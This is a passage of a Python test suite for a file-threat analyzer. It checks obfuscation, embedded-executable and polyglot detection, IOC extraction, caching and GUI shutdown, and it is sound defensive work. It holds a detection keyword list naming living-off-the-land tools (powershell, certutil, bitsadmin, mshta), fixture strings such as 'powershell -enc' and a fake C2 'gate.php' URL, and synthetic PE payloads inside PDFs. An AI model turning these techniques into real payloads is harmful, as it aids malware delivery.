    assert gui_mod.PyThreatAnalyzerGUI._UI_POLL_MS >= 50, "K2: sondeo de cola demasiado agresivo"

    class _FakeRoot:
        def __init__(self):
            self.callbacks, self.destroyed = [], False
        def after(self, _ms, fn, *args):
            self.callbacks.append((fn, args))
        def destroy(self):
            self.destroyed = True

    class _ListHandler(logging.Handler):
        def __init__(self):
            super().__init__(logging.WARNING)
            self.messages = []
        def emit(self, record):
            self.messages.append(record.getMessage())

    def make_gui(thread, grace):
        gui = object.__new__(gui_mod.PyThreatAnalyzerGUI)
        gui.root = _FakeRoot()
        gui.cache = None
        gui._shutdown = False
        gui._cancel_event = threading.Event()
        gui._analysis_thread = thread
        gui._CLOSE_GRACE_SECONDS = grace
        return gui

    def pump(gui, limit=5.0):
        started = time.monotonic()
        while not gui.root.destroyed and time.monotonic() - started < limit:
            pending, gui.root.callbacks = gui.root.callbacks, []
            for fn, args in pending:
                fn(*args)
            time.sleep(0.02)
        return time.monotonic() - started

    handler = _ListHandler()
    app_logger = logging.getLogger('PyThreatAnalyzer')
    app_logger.addHandler(handler)
    try:
        # (1) Worker que IGNORA la cancelación (parser nativo bloqueado).
        release = threading.Event()
        blocked = threading.Thread(target=lambda: release.wait(5), daemon=True)
        blocked.start()
        gui = make_gui(blocked, grace=0.3)
        gui._on_close()
        assert gui._cancel_event.is_set(), "M5: _on_close debe activar _cancel_event"
        assert not gui.root.destroyed, "no debe destruir bajo un worker vivo antes de la gracia"
        elapsed = pump(gui)
        assert gui.root.destroyed, "M5: tras la gracia el cierre debe forzarse"
        assert 0.25 <= elapsed < 3.0, elapsed
        assert blocked.is_alive(), "el worker sigue bloqueado: cierre forzado, no cooperativo"
        assert any('Cierre forzado: worker bloqueado' in m for m in handler.messages), handler.messages
        gui._finalize_close()  # idempotente
        release.set()

        # (2) Worker cooperativo: atiende el evento y el cierre NO es forzado.
        handler.messages.clear()
        holder = {}
        def cooperative():
            holder['event'].wait(5)
        coop = threading.Thread(target=cooperative, daemon=True)
        gui = make_gui(coop, grace=5.0)
        holder['event'] = gui._cancel_event
        coop.start()
        gui._on_close()
        elapsed = pump(gui)
        assert gui.root.destroyed and elapsed < 2.0, elapsed
        assert not any('Cierre forzado' in m for m in handler.messages), handler.messages

        # (3) Botón "Forzar cierre": _force_close finaliza de inmediato.
        release2 = threading.Event()
        stuck = threading.Thread(target=lambda: release2.wait(5), daemon=True)
        stuck.start()
        gui = make_gui(stuck, grace=60.0)
        gui._on_close()
        gui._force_close()
        assert gui.root.destroyed
        release2.set()
        print("✅ M5/K2. cancelación al cerrar, cierre forzado tras la gracia y botón Forzar cierre")
    finally:
        app_logger.removeHandler(handler)


def test_b01_sys_exit_legit_cli_no_puntua():
    section("B1: imports informativos (sys.exit, os.fork) no puntúan; los peligrosos sí")
    from script_analyzer import ScriptAnalyzer
    from risk_scoring import calculate_risk_score

    analyzer = ScriptAnalyzer()
    with tempfile.TemporaryDirectory() as tmp:
        def scan(name, code):
            path = os.path.join(tmp, name)
            with open(path, 'w', encoding='utf-8') as f:
                f.write(code)
            return analyzer.analyze_script(path)

        legit = scan('legit.py', "import sys\nfrom sys import exit\nfrom os import fork\n"
                                 "def main():\n    return 0\nsys.exit(main())\n")
        ast_res = legit['ast_analysis']
        assert ast_res['suspicious_calls'] == [], ast_res['suspicious_calls']
        assert set(ast_res['informational_imports']) == {'sys.exit', 'os.fork'}
        _score, _level, indicators = calculate_risk_score({}, legit)
        assert 'SCRIPT_SUSPICIOUS_IMPORT' not in indicators, indicators

        risky = scan('risky.py', "from subprocess import Popen\nfrom os import system\n")
        assert risky['ast_analysis']['suspicious_calls'], "los imports peligrosos deben seguir marcándose"
        _score, _level, indicators = calculate_risk_score({}, risky)
        assert 'SCRIPT_SUSPICIOUS_IMPORT' in indicators
    print("✅ B1. sys.exit/os.fork informativos; subprocess/os.system siguen puntuando")


def test_b02_jwt_not_flagged():
    section("B3 (B.2): JWT/data-URI/hex no suman ofuscación base64; un blob binario sí")
    import base64
    from script_analyzer import ScriptAnalyzer

    analyzer = ScriptAnalyzer()
    payload = base64.urlsafe_b64encode(
        b'{"sub":"1234567890","name":"Jane Doe","iat":1516239022,"role":"admin",'
        b'"scope":"read write delete"}').decode().rstrip('=')
    jwt = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9." + payload +
           ".SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
    assert analyzer._check_obfuscation_patterns(f'TOKEN = "{jwt}"\n') == 0, "JWT marcado"

    ascii_b64 = base64.b64encode(b'texto plano ' * 20).decode()
    assert analyzer._check_obfuscation_patterns(f'DATA = "{ascii_b64}"\n') == 0, "ASCII codificado marcado"
    assert analyzer._check_obfuscation_patterns('SHA = "' + 'ab12cd34' * 16 + '"\n') == 0, "hex marcado"
    binary_b64 = base64.b64encode(bytes(range(128, 256)) * 3).decode()
    assert analyzer._check_obfuscation_patterns(f'# {binary_b64}\n') == 0, "comentario marcado"
    assert analyzer._check_obfuscation_patterns(f'blob = "{binary_b64}"\n') >= 3, \
        "un blob que decodifica a binario debe seguir puntuando"
    # No es un fragmento de un token más largo con caracteres base64url
    assert analyzer._check_obfuscation_patterns('x = "' + 'A' * 99 + '"\n') == 0
    print("✅ B3. JWT/ASCII/hex/comentarios limpios; blob binario detectado")


def test_b04_pdf_with_embedded_pe():
    section("B4: PDF con PE/ELF/ZIP embebido (firma válida) se marca; streams aleatorios no")
    import os as _os
    import zlib
    from document_analyzer import DocumentAnalyzer
    from risk_scoring import calculate_risk_score

    pe = (b'MZ' + b'\x00' * 0x3A + struct.pack('<I', 0x80) + b'\x00' * 0x40 +
          b'PE\x00\x00' + b'\x00' * 100)
    analyzer = DocumentAnalyzer()
    with tempfile.TemporaryDirectory() as tmp:
        def scan(name, body):
            path = os.path.join(tmp, name)
            with open(path, 'wb') as f:
                f.write(body)
            return analyzer.analyze(path)

        res = scan('evil.pdf', b'%PDF-1.4\nstream\n' + pe + b'\nendstream\n%%EOF')
        assert any('PDF contiene firma de ejecutable/ZIP embebido (offset 16)' in s
                   for s in res['suspicious']), res['suspicious']
        _s, _l, indicators = calculate_risk_score(
            {'document_analysis': res, 'file': os.path.join(tmp, 'evil.pdf')})
        assert 'PDF_SUSPICIOUS' in indicators

        # 'MZ' suelto (sin PE\0\0) y streams comprimidos aleatorios: sin hallazgo
        noise = b'%PDF-1.4\n' + b'MZ' * 50 + zlib.compress(_os.urandom(200000)) + b'\n%%EOF'
        assert scan('ok.pdf', noise)['suspicious'] == []

        elf = b'\x7fELF\x02\x01\x01' + b'\x00' * 40
        res = scan('elf.pdf', b'%PDF-1.4\n' + elf + b'\n%%EOF')
        assert any('firma de ejecutable/ZIP embebido' in s for s in res['suspicious'])
        zipped = (b'PK\x03\x04' + struct.pack('<H', 20) + b'\x00' * 20 +
                  struct.pack('<H', 5) + b'\x00\x00' + b'a.txt')  # name_len @26
        res = scan('zip.pdf', b'%PDF-1.4\n' + zipped + b'\n%%EOF')
        assert any('firma de ejecutable/ZIP embebido' in s for s in res['suspicious'])
    print("✅ B4. firmas embebidas validadas; sin falsos positivos por 'MZ' al azar")


def test_c03_symlink_log_dir_rejected():
    section("B6 (C.3): log_dir y sus padres no pueden ser symlinks de un usuario no root")
    import app_logging

    with tempfile.TemporaryDirectory() as tmp:
        real = os.path.join(tmp, 'real')
        os.makedirs(real)
        link = os.path.join(tmp, 'link')
        try:
            os.symlink(real, link)
        except (OSError, NotImplementedError, AttributeError):
            print("⏭️  symlinks no soportados en este sistema; se omite")
            return

        # log_dir en sí es un symlink: siempre se rechaza.
        try:
            app_logging._reject_symlinked_log_path(link)
        except OSError as exc:
            assert 'enlace simbólico' in str(exc), exc
        else:
            raise AssertionError("log_dir symlink debe rechazarse")

        # Un directorio real (y uno aún inexistente bajo él) se acepta.
        app_logging._reject_symlinked_log_path(real)
        app_logging._reject_symlinked_log_path(os.path.join(real, 'logs', 'nuevo'))

        # Padre symlink: se rechaza si NO es de root. Se simula un propietario
        # no privilegiado (los symlinks creados por este test serían de root
        # al correr como root, que es una excepción documentada).
        real_lstat = os.lstat
        def fake_lstat(path, *a, **kw):
            st = real_lstat(path, *a, **kw)
            if os.path.abspath(path) == os.path.abspath(link):
                values = list(st)
                values[4] = 1000  # st_uid
                return os.stat_result(values)
            return st
        app_logging.os.lstat = fake_lstat
        try:
            try:
                app_logging._reject_symlinked_log_path(os.path.join(link, 'logs'))
            except OSError:
                pass
            else:
                raise AssertionError("padre symlink de usuario no root debe rechazarse")
        finally:
            app_logging.os.lstat = real_lstat

        # setup_logging aborta antes de crear nada si log_dir es un symlink.
        previous = app_logging._configured
        app_logging._configured = False
        try:
            try:
                app_logging.setup_logging(log_dir=link)
            except OSError:
                pass
            else:
                raise AssertionError("setup_logging debe rechazar log_dir symlink")
            assert not os.listdir(real), "no debe escribir logs a través del symlink"
        finally:
            app_logging._configured = previous
    print("✅ B6. directorio de logs y padres con symlink rechazados")


def test_c04_no_del_leak():
    section("B7 (C.4): AnalysisCache no define __del__; cada hilo cierra su conexión")
    import threading
    from analysis_cache import AnalysisCache

    assert '__del__' not in AnalysisCache.__dict__, "B7: __del__ engañoso eliminado"
    tmp = tempfile.mkdtemp()
    try:
        cache = AnalysisCache(os.path.join(tmp, 'c.db'))
        seen = {}
        def worker():
            cache.set('a' * 64, 'x', 'BAJO', {'k': 1})
            seen['conn'] = cache._get_conn()
            cache.close_thread_connection()
            seen['has_conn_after'] = hasattr(cache._local, 'conn')
        t = threading.Thread(target=worker)
        t.start()
        t.join()
        assert seen['has_conn_after'] is False
        assert cache.get('a' * 64)['risk_level'] == 'BAJO'
        cache.close_thread_connection()
        print("✅ B7. sin __del__; el contrato 'cierra por worker' funciona")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_e02_clear_expired_purges_old_engine_version():
    section("K1 (E.2): clear_expired purga versiones viejas del motor y respeta el trust decay")
    import json
    from datetime import datetime, timedelta
    import analysis_cache as ac

    tmp = tempfile.mkdtemp()
    try:
        db = os.path.join(tmp, 'c.db')
        cache = ac.AnalysisCache(db)
        conn = cache._get_conn()
        now = datetime.now().isoformat()
        old_date = (datetime.now() - timedelta(days=400)).isoformat()
        rows = [('a' * 64, ac.ENGINE_VERSION - 1, now),    # versión vieja, reciente
                ('b' * 64, ac.ENGINE_VERSION, now),        # vigente
                ('c' * 64, ac.ENGINE_VERSION, old_date)]   # vencida por TTL
        for h, version, date in rows:
            conn.execute(
                'INSERT INTO analysis_results (file_hash, file_path, analysis_date, '
                'engine_version, risk_level, report_json) VALUES (?, ?, ?, ?, ?, ?)',
                (h, 'x', date, version, 'BAJO', json.dumps({})))
        conn.commit()
        cache.set_whitelist_with_expiry('a' * 64, expiry_days=10)

        cache.clear_expired()
        remaining = {r[0] for r in conn.execute('SELECT file_hash FROM analysis_results')}
        assert remaining == {'b' * 64}, remaining
        assert conn.execute('SELECT COUNT(*) FROM whitelist_expirations').fetchone()[0] == 1, \
            "el trust decay no debe borrarse"

        # También por separado y al arrancar una instancia nueva.
        conn.execute(
            'INSERT INTO analysis_results (file_hash, file_path, analysis_date, '
            'engine_version, risk_level, report_json) VALUES (?, ?, ?, ?, ?, ?)',
            ('d' * 64, 'x', now, ac.ENGINE_VERSION - 2, 'BAJO', json.dumps({})))
        conn.commit()
        ac.AnalysisCache(db).close_thread_connection()   # __init__ purga
        assert conn.execute('SELECT COUNT(*) FROM analysis_results WHERE file_hash = ?',
                            ('d' * 64,)).fetchone()[0] == 0
        conn.execute(
            'INSERT INTO analysis_results (file_hash, file_path, analysis_date, '
            'engine_version, risk_level, report_json) VALUES (?, ?, ?, ?, ?, ?)',
            ('e' * 64, 'x', now, ac.ENGINE_VERSION - 3, 'BAJO', json.dumps({})))
        conn.commit()
        cache.clear_stale_versions()
        assert cache.stats()['total_entries'] == 1
        cache.close_thread_connection()
        print("✅ K1. clear_expired/clear_stale_versions purgan y __init__ limpia al arrancar")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_k04_risk_levels_single_source():
    section("K4 (F.1): niveles y pesos centralizados en risk_levels.py")
    import risk_levels
    import risk_scoring
    import explanation_engine
    import archive_analyzer

    assert risk_scoring._LEVEL_RANK_LAYERED is risk_levels.LEVEL_RANK
    assert explanation_engine._LEVEL_RANK is risk_levels.LEVEL_RANK
    assert archive_analyzer._LEVEL_RANK is risk_levels.LEVEL_RANK
    assert risk_scoring._ARCHIVE_LEVEL_WEIGHT is risk_levels.ARCHIVE_LEVEL_WEIGHT
    assert risk_scoring.SEVERITY_MAP is risk_levels.SEVERITY_MAP
    assert risk_scoring.DROPPER_MAX_POINTS == risk_levels.DROPPER_MAX_POINTS == 45
    assert risk_scoring.WHITELIST_SCORE_CAP == risk_levels.WHITELIST_SCORE_CAP == 15
    for score, level in ((0, 'SIN RIESGO DETECTADO'), (1, 'BAJO'), (25, 'MEDIO'),
                         (50, 'ALTO'), (80, 'CRÍTICO')):
        assert risk_levels.level_for_score(score) == level
        assert risk_scoring._level_for_score(score) == level
    assert 'SOSPECHOSO' in risk_levels.LEVEL_RANK
    print("✅ K4. una sola fuente de verdad para niveles/pesos")


def test_f02_sample_sha256_renamed():
    section("K5 (F.2): DynamicAnalyzer expone sample_sha256 (hash de lo leído)")
    import hashlib
    from dynamic_analyzer import DynamicAnalyzer

    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'blob.bin')
        data = os.urandom(5000)
        with open(path, 'wb') as f:
            f.write(data)
        res = DynamicAnalyzer(max_read_bytes=1000).analyze(path)
        assert 'file_hash' not in res, "K5: nombre ambiguo eliminado"
        assert res['sample_sha256'] == hashlib.sha256(data[:1000]).hexdigest()
        assert res['truncated'] is True
    print("✅ K5. sample_sha256 = SHA-256 de los bytes leídos")


def test_f03_single_url_in_pe_low_confidence():
    section("K6 (F.3): en PE un IOC de red aislado es de baja confianza")
    from dynamic_analyzer import DynamicAnalyzer

    analyzer = DynamicAnalyzer()
    junk = bytes(range(1, 32)) * 4

    def scan(blob):
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, 'sample.exe')
            with open(path, 'wb') as f:
                f.write(blob)
            return analyzer.analyze(path, 'PE32')

    manifest = (junk + b'\x00http://schemas.microsoft.com/SMI/2005/WindowsSettings\x00' + junk +
                b'\x00https://schemas.microsoft.com/SMI/2016/WindowsSettings\x00' + junk)
    res = scan(manifest)
    assert res['network_indicators'] == [], res['network_indicators']
    assert res['network_indicators_low_confidence'], "debe quedar visible como baja confianza"

    # Dos hosts distintos -> se conserva.
    res = scan(junk + b'\x00http://alpha.example.com/a\x00' + junk +
               b'\x00http://beta.badsite.top/b\x00' + junk)
    assert len(res['network_indicators']) >= 2

    # Un único host pero con marcador de comunicación en la misma cadena -> se conserva.
    res = scan(junk + b'\x00POST http://evil.example.top/gate.php\x00' + junk)
    assert any(i['type'] == 'url' for i in res['network_indicators']), res

    # No-PE: sin cambios (un único URL en un ELF/BINARY no pasa por este filtro).
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'sample.bin')
        with open(path, 'wb') as f:
            f.write(junk + b'\x00http://schemas.microsoft.com/x\x00' + junk)
        res = analyzer.analyze(path, 'BINARY')
        assert res['network_indicators'] and res['network_indicators_low_confidence'] == []
    print("✅ K6. IOC de red único en PE -> baja confianza; contexto/2 hosts -> se conserva")


def test_f04_total_size_preserved_on_bomb():
    section("K7 (F.4): total_size declarado se conserva cuando salta el límite")
    import zipfile
    from archive_analyzer import analyze_compressed_file, ArchiveLimits

    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, 'bomb.zip')
        with zipfile.ZipFile(path, 'w') as z:
            for i in range(10):
                z.writestr(f'f{i}.txt', 'a' * 50)
        res = analyze_compressed_file(
            path, limits=ArchiveLimits(max_total_size=100))
        assert res['risk_level'] == 'CRÍTICO', res
        assert any(p.startswith('ZIP_BOMB') for p in res['suspicious_patterns'])
        assert res['total_size'] == 500, res['total_size']

        res = analyze_compressed_file(path, limits=ArchiveLimits(max_file_count=3))
        assert res['risk_level'] == 'CRÍTICO' and res['total_size'] in (0, 500), res
    print("✅ K7. total_size == tamaño declarado aunque se lance ZipBombDetectedError")


def test_k08_coverage_gap_warnings():
    section("K8: aviso explícito de bases/reglas vacías (GUI/CLI)")
    import logging
    import cli as cli_mod
    from analysis_utils import coverage_gap_messages

    assert coverage_gap_messages() == []
    assert len(coverage_gap_messages(malware_hash_status='unavailable')) == 1
    assert len(coverage_gap_messages(malware_hash_status='empty', yara_rule_count=0)) == 2
    assert coverage_gap_messages(malware_hash_status='ready', known_bad_count=10,
                                 yara_rule_count=5) == []
    assert len(coverage_gap_messages(known_bad_count=0, yara_rule_count=0)) == 2
    fuzzy_gaps = coverage_gap_messages(tlsh_status='empty', ssdeep_status='unavailable')
    assert len(fuzzy_gaps) == 2 and all('Base ' in gap for gap in fuzzy_gaps), fuzzy_gaps

    class _Handler(logging.Handler):
        def __init__(self):
            super().__init__(logging.WARNING)
            self.messages = []
        def emit(self, record):
            self.messages.append(record.getMessage())

    handler = _Handler()
    logger = logging.getLogger('PyThreatAnalyzer')
    logger.addHandler(handler)
    try:
        obj = object.__new__(cli_mod.PyThreatAnalyzerCLI)
        obj.yara = type('Y', (), {'loaded_rule_count': 0})()
        results = {'reputation': {'database_status': {'malware_hashes': {'status': 'unavailable'}}}}
        first_gaps = obj._warn_coverage_gaps_once(results)
        second_gaps = obj._warn_coverage_gaps_once(results)  # sigue visible en cada reporte
        gaps = [m for m in handler.messages if 'Cobertura reducida' in m]
        assert len(gaps) == 2, handler.messages   # hashes + YARA, sin repetir
        assert len(first_gaps) == len(second_gaps) == 2
    finally:
        logger.removeHandler(handler)
    print("✅ K8. avisos de cobertura vacía (una sola vez por CLI)")


def test_eicar_test_rules_remain_visible_without_overstating_risk():
    from risk_scoring import calculate_risk_score
    matches = [
        {'rule': 'EICAR_Test_File', 'meta': {'severity': 'test'}},
        {'rule': 'EICAR_Test_File_Anywhere', 'meta': {'severity': 'test'}},
    ]
    score, level, indicators = calculate_risk_score({'yara': {'matches': matches}})
    assert score == 20 and level == 'BAJO', (score, level)
    assert any(item.startswith('YARA_MATCH(') for item in indicators), indicators
    print("✅ EICAR: match visible en YARA_MATCH; el riesgo bajo respeta severity=test")


def test_k09_scan_directory_retries_transient_oserror():
    section("K9: scan_directory/scan_file reintentan OSError transitorio (no FileNotFoundError)")
    import errno
    import cli as cli_mod

    sleeps = []
    original_sleep = cli_mod.time.sleep
    cli_mod.time.sleep = lambda s: sleeps.append(s)
    try:
        with tempfile.TemporaryDirectory() as tmp:
            for name in ('a.txt', 'b.txt'):
                with open(os.path.join(tmp, name), 'w', encoding='utf-8') as f:
                    f.write(name)

            obj = object.__new__(cli_mod.PyThreatAnalyzerCLI)
            attempts = {}

            # (a) scan_file lanza OSError(EIO) una vez en a.txt -> se reintenta.
            def flaky(path):
                attempts[path] = attempts.get(path, 0) + 1
                if path.endswith('a.txt') and attempts[path] == 1:
                    raise OSError(errno.EIO, 'NFS hiccup')
                return {'file': path, 'risk_level': 'BAJO', 'risk_score': 1}
            obj.scan_file = flaky
            results = obj.scan_directory(tmp, progress=False)
            assert len(results) == 2 and all('error' not in r for r in results), results
            assert attempts[os.path.join(tmp, 'a.txt')] == 2
            assert sleeps == [0.5], sleeps

            # (b) FileNotFoundError NO se reintenta.
            sleeps.clear(); attempts.clear()
            def vanished(path):
                attempts[path] = attempts.get(path, 0) + 1
                raise FileNotFoundError(path)
            obj.scan_file = vanished
            results = obj.scan_directory(tmp, progress=False)
            assert all('error' in r for r in results) and sleeps == []
            assert all(n == 1 for n in attempts.values()), attempts

            # (c) un OSError persistente se reintenta UNA vez y luego se reporta.
            sleeps.clear(); attempts.clear()
            def broken(path):
                attempts[path] = attempts.get(path, 0) + 1
                raise OSError(errno.EIO, 'persistente')
            obj.scan_file = broken
            results = obj.scan_directory(tmp, progress=False)
            assert all('error' in r for r in results)
            assert all(n == 2 for n in attempts.values()), attempts

            # (d) dentro de scan_file (donde SÍ se captura OSError y se devolvía
            # {'error':...} sin reintentar): el hash falla una vez y se recupera.
            sleeps.clear()
            sample = os.path.join(tmp, 'a.txt')
            calls = {'n': 0}
            class _Analyzer:
                def get_file_hashes(self, _p):
                    calls['n'] += 1
                    if calls['n'] == 1:
                        raise OSError(errno.EIO, 'NFS hiccup')
                    return {'sha256': 'a' * 64, 'md5': 'b' * 32, 'sha1': 'c' * 40}
            class _Engine:
                on_checkpoint = None
                def analyze_file(self, p, hashes=None):
                    return {'file': p, 'file_type': 'TEXT', 'hashes': hashes,
                            'risk_score': 0, 'risk_level': 'SIN RIESGO DETECTADO',
                            'indicators': [], 'layer_scores': {}, 'explanation': {},
                            'analysis_status': 'COMPLETE', 'analysis_warnings': [],
                            'whitelist': {}, 'archive_analysis': None}
            obj2 = object.__new__(cli_mod.PyThreatAnalyzerCLI)
            obj2.config = {'use_cache': False}
            obj2.force_rescan = False
            obj2.cache = None
            obj2.analyzer = _Analyzer()
            obj2.engine = _Engine()
            obj2.yara = type('Y', (), {'loaded_rule_count': 1})()
            report = obj2.scan_file(sample)
            assert 'error' not in report, report
            assert calls['n'] == 2 and sleeps == [0.5], (calls, sleeps)
    finally:
        cli_mod.time.sleep = original_sleep
    print("✅ K9. reintento único con backoff 0.5 s solo para OSError no-FileNotFoundError")



def test_r11_fuzzy_scan_limited_on_large_file():
    section("M2 (A.4): fuzzy_scan_limited se conserva con ssdeep y archivo > MAX_SSDEEP_FILE_SIZE")
    from types import SimpleNamespace
    import virus_analyzer as va
    from analysis_utils import collect_analysis_warnings

    saved = (va._SSDEEP_AVAILABLE, getattr(va, 'ssdeep', None), va.MAX_SSDEEP_FILE_SIZE)
    va._SSDEEP_AVAILABLE = True
    va.ssdeep = SimpleNamespace(hash_from_file=lambda _p: '3:abc:def')
    va.MAX_SSDEEP_FILE_SIZE = 1000
    try:
        with tempfile.TemporaryDirectory() as tmp:
            big = os.path.join(tmp, 'big.bin')
            with open(big, 'wb') as f:
                f.write(os.urandom(5000))
            analyzer = va.StaticAnalyzer(hash_db_path=os.path.join(tmp, 'm.txt'),
                                         whitelist_db_path=os.path.join(tmp, 'g.txt'))
            analyzer.known_bad_tlsh = {f"T1{i:070X}" for i in range(va._FUZZY_SCAN_MAX + 1)}
            rep = analyzer.check_reputation(big)
            assert rep.get('ssdeep_skipped') is True, "debe tomar la rama de tamaño"
            lim = rep.get('fuzzy_scan_limited')
            assert lim and lim['tlsh_refs'] == va._FUZZY_SCAN_MAX + 1, rep
            warnings = collect_analysis_warnings(reputation=rep)
            assert any('Coincidencia difusa limitada' in w for w in warnings), warnings

            # Mismo DB, archivo pequeño: el aviso sigue ahí (consistencia).
            small = os.path.join(tmp, 'small.bin')
            with open(small, 'wb') as f:
                f.write(os.urandom(500))
            assert 'fuzzy_scan_limited' in analyzer.check_reputation(small)
            # DB pequeña: sin aviso.
            analyzer.known_bad_tlsh = {f"T1{i:070X}" for i in range(10)}
            assert 'fuzzy_scan_limited' not in analyzer.check_reputation(big)
    finally:
        va._SSDEEP_AVAILABLE, va.ssdeep, va.MAX_SSDEEP_FILE_SIZE = saved
    print("✅ M2. aviso de cobertura fuzzy limitada también para archivos > 100 MB")


def test_b03_pe_zip_in_overlay_middle():
    section("M3 (B.3): PE + relleno + ZIP (con comentario) + basura final se detecta")
    import io
    import zipfile
    import virus_analyzer as va

    def make_zip(comment_len):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w') as zf:
            zf.writestr('a.txt', 'hola')
            zf.comment = b'c' * comment_len
        return buf.getvalue()

    analyzer = va.StaticAnalyzer()
    adv = va.get_advanced_features(analyzer)
    with tempfile.TemporaryDirectory() as tmp:
        # PE + 1 KB basura + ZIP con comentario de 8000 B (EOCD > 4 KiB del final)
        # + 1 KB basura final.
        blob = os.urandom(1024) + make_zip(8000) + os.urandom(1024)
        path = _make_test_pe(os.path.join(tmp, 'mid.exe'), trailing=blob)
        assert os.path.getsize(path) - blob.rfind(b'PK\x05\x06') < 20000
        findings = analyzer.check_polyglot(path)
        assert any('PE+ZIP' in f for f in findings), findings
        overlay = adv.detect_overlay(path)
        assert overlay and overlay['is_zip'] is True, overlay

        # Caso clásico (ZIP al final) sigue funcionando.
        path2 = _make_test_pe(os.path.join(tmp, 'tail.exe'), trailing=make_zip(0))
        assert any('PE+ZIP' in f for f in analyzer.check_polyglot(path2))

        # Sin ZIP: ni polyglot ni is_zip, aunque el relleno aleatorio sea grande.
        path3 = _make_test_pe(os.path.join(tmp, 'clean.exe'), trailing=os.urandom(70000))
        assert analyzer.check_polyglot(path3) == []
        ov3 = adv.detect_overlay(path3)
        assert ov3 and ov3['is_zip'] is False

        # Firma 'PK\x05\x06' suelta con campos inverosímiles: no es polyglot.
        fake = (b'PK\x05\x06' + b'\x00' * 8 + struct.pack('<IIH', 5000, 9_000_000, 0))
        path4 = _make_test_pe(os.path.join(tmp, 'fake.exe'), trailing=os.urandom(500) + fake)
        assert analyzer.check_polyglot(path4) == []
    print("✅ M3. polyglot PE+ZIP con EOCD fuera de los últimos 4 KiB detectado")


def test_a03_extract_strings_early_stop():
    section("B2 (A.3): extract_strings corta pronto, descarta rachas de 4 B y conserva el resultado")
    import re
    import time
    import virus_analyzer as va

    url_re = re.compile(r'https?://[^\s]+')
    ip_re = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')

    def reference(data):
        """Algoritmo ORIGINAL (findall + max_seen 100 000, sin corte)."""
        expected = {'urls': [], 'ips': [], 'suspicious_commands': []}
        seen = set()
        for m in re.findall(rb'[\x20-\x7E]{4,}', data):
            d = m.decode('ascii')
            if len(seen) < 100_000:
                if d in seen:
                    continue
                seen.add(d)
            if url_re.search(d) and len(expected['urls']) < 25:
                expected['urls'].append(url_re.search(d).group(0))
            if ip_re.search(d) and len(expected['ips']) < 25:
                expected['ips'].append(ip_re.search(d).group(0))
            if len(expected['suspicious_commands']) < 25 and any(
                    k in d.lower() for k in ('powershell', 'cmd.exe', 'wscript', 'certutil', 'bitsadmin', 'mshta')):
                expected['suspicious_commands'].append(d.strip())
        return expected

    def timed(fn, *args):
        started = time.perf_counter()
        result = fn(*args)
        return result, time.perf_counter() - started

    analyzer = va.StaticAnalyzer()
    with tempfile.TemporaryDirectory() as tmp:
        def write(name, data):
            path = os.path.join(tmp, name)
            with open(path, 'wb') as f:
                f.write(data)
            return path

        head = b''.join(
            b'http://host%d.example.com/x\x00' % i + b'10.0.%d.%d\x00' % (i % 250, i % 250) +
            b'powershell -enc %d\x00' % i for i in range(100))
        cases = {
            # (a) 1 M de rachas de 4 caracteres: ninguna puede ser IOC.
            'flood4': b'abcd\x00' * 1_000_000,
            # (b) IOCs al inicio y luego un diluvio de rachas de 5 B: corte temprano.
            'early': head + b'abcde\x00' * 1_000_000,
        }
        for name, data in cases.items():
            path = write(name + '.bin', data)
            got, fast = timed(analyzer.extract_strings, path)
            want, slow = timed(reference, data)
            for key in want:
                assert got[key] == want[key], (name, key)
                assert len(got[key]) <= 25
            # Comparación relativa (robusta a la velocidad de la máquina).
            assert fast < slow * 0.6, f"{name}: {fast:.3f}s no es claramente menor que el original {slow:.3f}s"

        # (c) Equivalencia en datos mixtos con rachas de 4 B, duplicados y binario.
        mixed = (b'abc\x00abcd\x00http://a.example.com/p\x00 x \x00192.168.0.1\x00'
                 b'cmd.exe /c dir\x00mshta x\x00' + os.urandom(2000) +
                 b'https://b.example.org\x00wscript.exe\x00')
        got = analyzer.extract_strings(write('mixed.bin', mixed))
        want = reference(mixed)
        for key in want:
            assert got[key] == want[key], (key, got[key], want[key])
    print("✅ B2. rachas de 4 B descartadas, corte temprano y resultado equivalente al original")


def test_c01_ordered_refs_mutation_same_length():
    section("B5 (C.1): _ordered_refs se invalida con mutaciones de igual longitud")
    import virus_analyzer as va

    analyzer = va.StaticAnalyzer()
    analyzer.known_bad_tlsh = {'a', 'b', 'c'}
    assert analyzer._ordered_refs('known_bad_tlsh') == ('a', 'b', 'c')
    analyzer.known_bad_tlsh.discard('a')
    analyzer.known_bad_tlsh.add('z')           # misma longitud
    assert len(analyzer.known_bad_tlsh) == 3
    assert analyzer._ordered_refs('known_bad_tlsh') == ('b', 'c', 'z'), "snapshot obsoleto"
    cached = analyzer._ordered_refs('known_bad_tlsh')
    assert analyzer._ordered_refs('known_bad_tlsh') is cached, "sin cambios debe reutilizar caché"
    analyzer.known_bad_tlsh = {'x', 'y', 'w'}  # otro objeto
    assert analyzer._ordered_refs('known_bad_tlsh') == ('w', 'x', 'y')
    print("✅ B5. la caché de referencias detecta mutaciones de igual longitud")


def test_m04_verifier_skips_main_import_without_tkinter():
    section("M4 (D.1): el verificador omite solo el import de main sin tkinter")
    import importlib
    import verificar_y_empaquetar as v

    assert 'main.py' in v.REQUIRED_FILES and 'main' in v.IMPORTABLE, "main.py debe seguir en el ZIP"
    assert 'risk_levels.py' in v.REQUIRED_FILES, "K4: risk_levels.py debe empaquetarse"

    saved_flag, saved_warned = v._TKINTER_AVAILABLE, list(v.WARNED)
    saved_import, saved_path = importlib.import_module, list(sys.path)
    recorded = []
    try:
        v._TKINTER_AVAILABLE = False
        v.WARNED.clear()
        assert v._skip_import_check('main') is True
        assert v._skip_import_check('cli') is False
        assert any('import main omitido: tkinter no disponible' in w for w in v.WARNED), v.WARNED

        importlib.import_module = lambda name, *a, **k: recorded.append(name)
        project = os.path.dirname(os.path.abspath(v.__file__))
        assert v.phase_import(project) is True, v.FAILED
        assert 'main' not in recorded and 'cli' in recorded, recorded

        v._TKINTER_AVAILABLE = True
        recorded.clear()
        assert v.phase_import(project) is True
